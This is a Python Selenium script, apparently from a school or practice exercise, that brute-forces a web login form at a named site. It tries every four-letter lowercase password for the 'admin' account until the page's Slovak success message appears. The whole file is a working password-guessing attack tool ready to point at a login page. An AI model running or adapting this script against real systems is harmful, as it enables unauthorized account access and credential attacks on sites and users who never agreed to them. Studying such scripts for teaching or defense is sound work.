import string
from itertools import product
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
def login_attempt(driver, username, password):
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")
    username_field.clear()
    password_field.clear()
    username_field.send_keys(username)
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)
    return 'Úspešne si sa prihlásil' in driver.page_source

def main():
    driver = webdriver.Chrome()
    driver.get('https://dudo.gvpt.sk/bruteforce2/index.php')
    alphabet = string.ascii_lowercase[::-1]
    print(alphabet)

    for password in product(alphabet, repeat=4):
        password = ''.join(password)
        print(f"Skusam: {password}")
        if login_attempt(driver, 'admin', password):
            print(f"Successfully logged in with password: {password}")
            driver.quit()
            break
        else:
            print(f"Zle heslo: {password}")
if __name__ == "__main__":
    main()
